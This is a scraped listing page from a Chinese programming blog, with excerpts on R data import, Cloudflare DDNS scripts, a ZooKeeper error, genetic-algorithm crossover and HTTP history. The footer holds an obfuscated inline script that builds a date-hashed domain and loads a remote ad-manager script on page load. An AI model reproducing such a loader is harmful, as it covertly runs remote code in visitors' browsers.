			<a href="/posts/09a23d11df5747c2d6d5993da873e8cb/" rel="bookmark">
			R语言 从excel导入数据，由于内容有excel的换行符导致列数不一致的问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 R语言 从excel导入数据，由于内容有excel的换行符导致列数不一致的问题 问题描述解决办法1. 在excel中先通过trim和clean函数进行预处理2. 读入数据简单的方法是，将清理后的数据复制粘贴到文本编辑器，保存为txt，通过readr包的read_table2读入如果想保存为csv，需通过emeditor转为csv后，通过read_csv读入 问题描述 数据在excel中，一般导入方法是通过read.table(“clipboard”, sep = ‘\t’)的方法读取数据。
但是有时候excel中会有某一单元格通过(alt + 回车)数据换行的情况，导致读取错位，提示某一行的列数不一致：
Error in scan(file = file, what = what, sep = sep, quote = quote, dec = dec, :
line 269 did not have 26 elements
如果把数据放到emeditor中去查看，会发现数据中确实会有很多换行
解决办法 1. 在excel中先通过trim和clean函数进行预处理 新建一个sheet，输入公式
=CLEAN(TRIM(表名!A1))
然后横向手动拖拉填充 + 纵向填充（快捷键crtl+D），具体操作手法可以百度一下，目的是把源表的每一个数据通过clean清除换行空格等特殊字符
2. 读入数据 注：这里是用readr包的函数读入，用内置的read.table或者read.csv依然会报错
简单的方法是，将清理后的数据复制粘贴到文本编辑器，保存为txt，通过readr包的read_table2读入 library(readr) t2 = read_table2("C:/Users/admin/Desktop/tmp.txt") 如果想保存为csv，需通过emeditor转为csv后，通过read_csv读入 复制进emeditor后先用制表符分隔
再转为用逗号分隔的csv文件
点击这个魔法棒的图标后，右侧会出现csv转换器
选择逗号分隔后，点击立即转换，完成后这个文件就已经是转为了标准格式的csv文件了，另存为csv。
可选择文件编码
3. 用readr包的read_csv读取文件
library(readr) t2 = read_csv("C:/Users/admin/Desktop/tmp.csv") 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2dc8c2a925af68be4987fbcd772e9177/" rel="bookmark">
			Cloudflare DDNS梅林插件代码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Cloudflare-DDNS梅林固件插件地址：https://ww.lanzous.com/iba19cd
直接在梅林固件安装即可。
主要修改了cfddns\scripts\cfddns_update.sh的Cloudflare DDNS插件代码：
#!/bin/sh eval `dbus export cfddns_` if [ "$cfddns_enable" != "1" ]; then echo "not enable" exit fi now=`date '+%Y-%m-%d %H:%M:%S'` ip=`$cfddns_curl 2&gt;&amp;1` || die "$ip" [ "$cfddns_curl" = "" ] &amp;&amp; cfddns_curl="curl -s whatismyip.akamai.com" [ "$cfddns_ttl" = "" ] &amp;&amp; cfddns_ttl="600" die() { echo $1 dbus ram cfddns_last_act="$now: failed($1)" } update_record() { curl -X PUT "https://api.cloudflare.com/client/v4/zones/$cfddns_zone/dns_records/$cfddns_id" \ -H "X-Auth-Email: $cfddns_email" \ -H "X-Auth-Key: $cfddns_key" \ -H "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2dc8c2a925af68be4987fbcd772e9177/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4b1b3306801dbdc733c4647167050933/" rel="bookmark">
			zookeeper 客户端提示：zookeeper kejava.lang.IllegalArgumentException: Path must start with / character
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		今天第一次使用zookeeper 开源客户端Curator 编写 涉及zookeeper 的代码提示如下错误信息：
java.lang.IllegalArgumentException: Path must start with / character at org.apache.zookeeper.common.PathUtils.validatePath(PathUtils.java:51) at org.apache.zookeeper.ZooKeeper.delete(ZooKeeper.java:851) at com.zzg.file.component.FileComponent.init() 报错代码： zkClient.create().withMode(CreateMode.EPHEMERAL).forPath(names[i + 1], names[i].getBytes()); 正确代码： zkClient.create().withMode(CreateMode.EPHEMERAL).forPath("/" + names[i + 1], names[i].getBytes()); 解决方法： ZooKeeper 节点名称以“/”打头
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b7bf4aa85a4fb6f29422cf440ec5ce6b/" rel="bookmark">
			进化计算-遗传算法之史上最直观交叉算子（动画演示）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		获取更多资讯，赶快关注上面的公众号吧！
文章目录 第二十章 遗传算法-史上最直观交叉算子（动画演示）20.1 单点交叉（Single-point crossover）20.2 两点交叉（Two-points crossover）20.3 多点交叉（Multi-point crossover）20.4 部分匹配交叉（Partially-matched crossover，PMX）20.5 均匀交叉（Uniform crossover）20.6 顺序交叉（Order Crossover，OX）20.7 基于位置的交叉（Position-based Crossover，PBX）20.8 基于顺序的交叉（Order-Based Crossover，OBX）20.9 循环交叉（Cycle Crossover，CX）20.10 子路径交叉交叉（Subtour Exchange Crossover，SEX） 第二十章 遗传算法-史上最直观交叉算子（动画演示） 遗传算法通过交叉算子来维持种群的多样性，应该说交叉算子是遗传算法中最重要的操作。针对不同的优化问题，有多种不同的交叉算子，今天将带领大家以动画的形式，直观地介绍不同交叉算子的原理。制作不易，感谢关注。
20.1 单点交叉（Single-point crossover） 单点交叉通过选取两条染色体，在随机选择的位置点上进行分割并交换右侧的部分，从而得到两个不同的子染色体。单点交叉是经典的交叉形式，与多点交叉或均匀交叉相比，它交叉混合的速度较慢（因为将染色体分成两段进行交叉，这种方式交叉粒度较大），然而对于选取交叉点位置具有一定内在含义的问题而言，单点交叉可以造成更小的破坏。
20.2 两点交叉（Two-points crossover） 两点交叉是指在个体染色体中随机设置了两个交叉点，然后再进行部分基因交换。两点交叉的具体操作过程是：
在相互配对的两个个体编码串中随机设置两个交叉点；交换两个个体在所设定的两个交叉点之间的部分染色体。
20.3 多点交叉（Multi-point crossover） 多点交叉或称广义交叉，是指在个体染色体中随机设置多个交叉点，然后进行基因交换。其操作过程与单点交叉和两点交叉相类似。如果多点交叉只选择了一个交叉点，那么多点交叉就变成了单点交叉。
20.4 部分匹配交叉（Partially-matched crossover，PMX） 部分匹配交叉保证了每个染色体中的基因仅出现一次，通过该交叉策略在一个染色体中不会出现重复的基因，所以PMX经常用于旅行商（TSP）或其他排序问题编码。
PMX类似于两点交叉，通过随机选择两个交叉点确定交叉区域。执行交叉后一般会得到两个无效的染色体，个别基因会出现重复的情况，为了修复染色体，可以在交叉区域内建立每个染色体的匹配关系，然后在交叉区域外对重复基因应用此匹配关系就可以消除冲突。
Step1：随机选择一对染色体（父代）中几个基因的起止位置（两染色体被选位置相同）。
Step2：交换这两组基因的位置。
Step3：做冲突检测，根据交换的两组基因建立一个映射关系，如图所示，以7-5-2这一映射关系为例，可以看到第二步结果中子代1存在两个基因7，这时将其通过映射关系转变为基因2，以此类推至没有冲突为止。最后所有冲突的基因都会经过映射，保证形成的新一对子代基因无冲突。
最终结果为：
动画效果如下：
20.5 均匀交叉（Uniform crossover） 均匀交叉也称一致交叉，在均匀交叉中，两个染色体的索引i处的基因以交换概率pS进行交换。经验研究表明，均匀交叉比是一种更具利用性的方法，这样可以更好地搜索设计空间，同时保持良好的信息交换。
20.6 顺序交叉（Order Crossover，OX） 在两个父代染色体中随机选择起始和结束位置，将父代染色体1该区域内的基因复制到子代1相同位置上，再在父代染色体2上将子代1中缺少的基因按照顺序填入。另一个子代以类似方式得到。与PMX不同的是，OX不用进行冲突检测工作（实际上也只有PMX需要做冲突检测）。
Step1：与PMX相同，随机选择一对染色体（父代）中几个基因的起止位置（两染色体被选位置相同）。
Step2：生成一个子代，并保证子代中被选中的基因的位置与父代相同。
Step3：先找出第一步选中的基因在另一个父代中的位置，再将其余基因按顺序放入上一步生成的子代中。
动画效果如下：
20.7 基于位置的交叉（Position-based Crossover，PBX） 在两个父代染色体中随机选择几个位置，位置可以不连续，将父代染色体1这些位置上的基因复制到子代1相同位置上，再在父代染色体2上将子代1中缺少的基因按照顺序填入。另一个子代以类似方式得到。PBX与OX的不同在于选取的位置可以不连续。
Step1：随机选择一对染色体（父代）中几个基因，位置可不连续，但两染色体被选位置相同。
Step2：与OX的第二步相同，生成一个子代，并保证子代中被选中的基因的位置与父代相同。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b7bf4aa85a4fb6f29422cf440ec5ce6b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/226a0c409c8f87a3d75d96ac9f5fe086/" rel="bookmark">
			互联网诞生30周年，看HTTP和HTTPS的起源发展
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		今天我们能够在网络中畅游，随时通过网络获取资源、信息，都得益于一位计算机科学家蒂姆·伯纳斯·李的构想。1991年8月6日，蒂姆·伯纳斯·李在位于欧洲粒子物理研究所（CERN）的NeXT计算机上，正式公开运行世界上第一个Web网站（http://info.cern.ch），建立起基本的互联网基础概念和技术体系，由此开启了网络信息时代的序幕。
万维网www构想的诞生
1989 年 3 月 12 日，欧洲粒子物理研究所（CERN）的计算机科学家蒂姆·伯纳斯·李在其一份提案《Information Management: A Proposal》中提出了一个构想：创建一个以超文本系统为基础的项目，允许在不同计算机之间分享信息，其目的是方便研究人员分享及更新信息。这个构想最终成了WWW（World Wide Web）万维网的基础，彻底改变了人类社会的沟通交流方式。
伯纳斯·李的提案包含了网络的基本概念并逐步建立了所有必要的工具：
提出HTTP (Hypertext Transfer Protocol) 超文本传输协议，允许用户通过单击超链接访问资源；
提出使用HTML超文本标记语言(Hypertext Markup Language)作为创建网页的标准；
创建了统一资源定位器URL (Uniform Resource Locator)作为网站地址系统，就是沿用至今的http://www URL格式；
创建第一个Web浏览器，称为万维网浏览器，这也是一个Web编辑器；
创建第一个HTTP 服务器软件，后来称为CERN httpd；
创建第一个Web服务器（http://info.cern.ch）以及描述项目本身的第一个Web页面。
不过这个提案在当时并没有引起人们的兴趣。1993年4月30日，欧洲粒子物理研究所（CERN）将万维网软件开源，发布了一个开放式许可证，使得万维网得到最大化的传播。但直到20世纪90年代中期吉姆·克拉克和马克·安德森在Netscape（网景通信公司）推广商业网页浏览这一概念后，万维网的应用才开始真正爆发。
HTTP协议的诞生和发展
超文本传输协议（HTTP）是应用层的一个协议，是万维网生态系统的核心。HTTP 协议采用 BS 架构，也就是浏览器到服务器的架构，客户端通过浏览器发送 HTTP 请求给服务器，服务器经过解析响应客户端的请求。
HTTP 是基于 TCP/IP 协议的应用层协议，在 OSI 七层模型中在最上层，它并不涉及数据包（packet）传输，主要规定了客户端和服务器之间的通信格式，默认使用80端口。
HTTP 协议最早的一个版本是1991年发布的 HTTP/0.9，这个版本只有一个命令：GET。通过 GET 你可以获取服务器的资源，比如请求服务器根目录下的 index.html 文件。这个版本的协议规定，服务器只能回应HTML格式的字符串，不能回应别的格式，也就是说今天的图像、视频等多媒体资源，在 HTTP/0.9这个版本上是无法进行传输的。
1996年5月，HTTP/1.0 版本发布，增加了POST命令和HEAD命令，丰富了浏览器与服务器的互动手段。这个版本HTTP协议可以发送任何格式的内容，包括传输文字、图像、视频、文件，这为互联网的大发展奠定了基础。
HTTP/1.0 除了增加了请求方法以及对发送文件的支持之外，还增加了格式的改变。除了数据部分，每次通信都必须包括头信息（HTTP header），用来描述一些元数据。另外还增加了状态码、多字符集支持、多部分发送（multi-part type）、权限（authorization）、缓存（cache）、内容编码（content encoding）等等。
HTTP/1.0 版也并不是完美的，它的主要缺点是，每一次建立TCP连接只能发送一个请求。发送数据完毕，连接就关闭，如果还要请求其他资源，就必须再新建一个连接。如果多次请求，势必就会对服务器产生较大的资源性能损耗。
1997年1月，HTTP/1.1 版本发布，这个版本只比 1.0 版本晚了半年。这个版本最大的变化就是将持久化连接加入了 HTTP 标准，即TCP连接默认不关闭，可以被多个请求复用。此外，HTTP/1.1版还新增了许多方法，例如：PUT、PATCH、HEAD、 OPTIONS、DELETE。得到进一步完善的HTTP/1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/226a0c409c8f87a3d75d96ac9f5fe086/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c36aa4b13002e26d5cb9a4415b24d8cc/" rel="bookmark">
			openwrt自动更新cloudflare的域名解释实现DDNS
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		实例介绍在openwrt上用curl更新cloudflare的域名解释，以实现开机自动DDNS。
一、官方例子
例子连接：https://api.cloudflare.com/#dns-records-for-a-zone-list-dns-records
将例子简单化：
curl -X PUT "https://api.cloudflare.com/client/v4/zones/{主域名zoneID}/dns_records/{要做DDNS的域名ID}" \ -H "X-Auth-Email: 你cloudflare登陆EMAIL" \ -H "X-Auth-Key: 你的API Key" \ -H "Content-Type: application/json" \ --data '{"id":"{要做DDNS的域名ID}","type":"A","name":"{要做DDNS的域名}","content":"{要做DDNS域名的IP}","zone_id":"{主域名zoneID}","zone_name":"{主域名}"}' 二、定位数据
通过上面简单化的例子，关键是要获取三个KEY。
1，X-Auth-Key：可以在https://www.cloudflare.com/a/account/my-account 下找到，下面的Global API Key就是了。
2，主域名zoneID：
写一个*.sh文件，其中将{主域名}替换为你自己的，如我的就是: xxxx.com
#! /bin/sh curl --insecure -X GET "https://api.cloudflare.com/client/v4/zones?name={主域名}&amp;amp;status=active&amp;amp;page=1&amp;amp;per_page=20&amp;amp;order=status&amp;amp;direction=desc&amp;amp;match=all" \ -H "X-Auth-Email: 你cloudflare登陆EMAIL" \ -H "X-Auth-Key: 你的API Key" \ -H "Content-Type: application/json" \ 执行完之后，会看到，如：
{"result":[{"id":"12346789abcdefghijklmnopqrstuvw","name":"ztjal.info","status":"active","paused":false...后略 id后面的“12346789abcdefghijklmnopqrstuvw”就是主域名的zoneID
3，要做DDNS的域名ID
继续使用刚才的*.sh文件，其中将{要做DDNS的域名}替换为你自己的，如我的就是: myddns.xxxx.com
#! /bin/sh curl --insecure -X GET "https://api.cloudflare.com/client/v4/zones/12346789abcdefghijklmnopqrstuvw/dns_records?type=A&amp;amp;name={要做DDNS的域名}&amp;amp;page=1&amp;amp;per_page=20&amp;amp;order=type&amp;amp;direction=desc&amp;amp;match=all" \ -H "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c36aa4b13002e26d5cb9a4415b24d8cc/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/244/">«</a>
	<span class="pagination__item pagination__item--current">245/306</span>
	<a class="pagination__item pagination__item--next btn" href="/page/246/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程爱好者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151260"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>